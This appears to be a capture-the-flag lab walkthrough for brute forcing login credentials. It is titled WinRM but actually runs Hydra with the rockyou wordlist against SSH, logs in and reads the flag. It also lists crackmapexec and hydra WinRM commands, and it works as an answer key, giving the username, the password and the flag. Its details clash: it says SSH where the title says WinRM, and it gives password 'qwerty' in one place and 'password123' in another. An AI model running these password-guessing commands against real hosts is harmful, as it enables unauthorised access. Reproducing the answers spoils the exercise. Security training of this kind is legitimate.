# Lab 5.4: WinRM Credential Brute Force
## Learning Objectives
- Brute force WinRM credentials
- Use Hydra for WinRM
- Capture the flag
## Solution Walkthrough

### Step 1: Obtain Target IP Address

Get the target IP address from the lab platform before starting brute force.

**Detailed Steps:**

1. **Discover the target IP:**
   - The lab panel shows your network subnet (e.g., `10.X.Y.0/24`)
   - Scan the subnet to find live hosts: `nmap -sn <subnet>`
   - The target will be one of the discovered hosts

2. **Verify network connectivity:**
   ```bash
   ping -c 3 <target_ip>
   ```

3. **Verify SSH service is running (WinRM alternative):**
   ```bash
   nmap -p 22 <target_ip>
   ```

### Step 2: Brute Force

Use Hydra to brute force SSH credentials (WinRM alternative in this lab).

**Detailed Steps:**

1. **Verify Hydra is installed:**
   ```bash
   which hydra
   hydra -h
   ```

2. **Prepare password wordlist:**
   ```bash
   # Use rockyou.txt (large wordlist)
   ls -la /usr/share/wordlists/rockyou.txt
   
   # Or create smaller wordlist for faster testing
   echo -e "password\nadmin\nadmin123\nqwerty\n123456\npassword123" > wordlist.txt
   ```

3. **Run Hydra brute force attack:**
   ```bash
   hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://<target_ip>
   ```
   
   Replace `<target_ip>` with your actual target IP (e.g., `hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://<target_ip>`)

   **Command breakdown:**
   - `hydra`: Brute force tool
   - `-l admin`: Single username to test (lowercase L)
   - `-P /usr/share/wordlists/rockyou.txt`: Password wordlist (uppercase P)
   - `ssh://<target_ip>`: SSH protocol and target IP

4. **Expected output:**
   ```
   Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak
   Hydra starting at 2024-01-15 10:30:00
   [DATA] max 16 tasks per 1 server, overall 16 tasks, 14344391 login tries (l:1/p:14344391), ~896524 try per task
   [DATA] attacking ssh://<target_ip>:22/
   [22][ssh] host: <target_ip>   login: admin   password: qwerty
   [STATUS] attack finished for <target_ip> (waiting for children to complete tests)
   1 of 1 target successfully completed, 1 valid password found
   ```

5. **Key information from output:**
   - **Valid password found**: `password: qwerty`
   - **Login**: `admin`
   - **Target**: `<target_ip>`

6. **Alternative: Use smaller wordlist for faster testing:**
   ```bash
   head -1000 /usr/share/wordlists/rockyou.txt > wordlist.txt
   hydra -l admin -P wordlist.txt ssh://<target_ip>
   ```

**Troubleshooting:**
- If Hydra is slow, use smaller wordlist
- Try with verbose output: `hydra -V -l admin -P wordlist.txt ssh://<target_ip>`
- Reduce parallel connections: `hydra -t 1 -l admin -P wordlist.txt ssh://<target_ip>`
- Verify SSH service is running on port 22

### Step 3: Connect

Use the discovered password to connect via SSH.

**Detailed Steps:**

1. **Connect with discovered credentials:**
   ```bash
   ssh admin@<target_ip>
   ```
   
   Replace `<target_ip>` with your actual target IP.

2. **Enter password when prompted:**
   ```
   admin@<target_ip>'s password:
   ```
   
   Type the password discovered by Hydra (e.g., `password123`)

3. **Expected successful connection:**
   ```
   Welcome to Ubuntu 20.04.5 LTS
   ...
   admin@target:~$
   ```

### Step 4: Retrieve Flag

Locate and view the flag file on the system.

**Detailed Steps:**

1. **Check current directory:**
   ```bash
   pwd
   ls -la
   ```

2. **View flag:**
   ```bash
   cat flag.txt
   ```

3. **If flag is not in current directory:**
   ```bash
   find ~ -name "flag.txt" 2>/dev/null
   cat ~/flag.txt
   ```

4. **Expected flag content:**
   ```
   OCR{w1nrm_brut3}
   ```

5. **Copy flag:**
   - Select flag text
   - Copy to clipboard (Ctrl+Shift+C in terminal)

6. **Exit SSH session:**
   ```bash
   exit
   ```

### Step 5: Verify Flag Format

Ensure the flag is in the correct format before submission.

**Flag format:**
```
OCR{w1nrm_brut3}
```

**Verification checklist:**
- ✅ Starts with `OCR{`
- ✅ Ends with `}`
- ✅ Contains only alphanumeric characters and underscores
- ✅ No extra spaces or characters

**Success Criteria:**
- ✅ Verified target IP and SSH service accessibility
- ✅ Prepared password wordlist (rockyou.txt or custom)
- ✅ Ran Hydra brute force attack against SSH service
- ✅ Discovered valid password for admin user
- ✅ Successfully connected via SSH with discovered credentials
- ✅ Located and viewed flag.txt
- ✅ Verified flag format is correct: `OCR{...}`

**Note on Real WinRM Brute Forcing:**
In real-world scenarios, you would use:
- `hydra -l admin -P wordlist.txt winrm://<target_ip>` (if supported)
- `crackmapexec winrm <target_ip> -u admin -p password123`
- Custom scripts using WinRM libraries
## Hints
1. Use hydra for SSH (WinRM alternative)
2. Username: admin
3. Password in common wordlists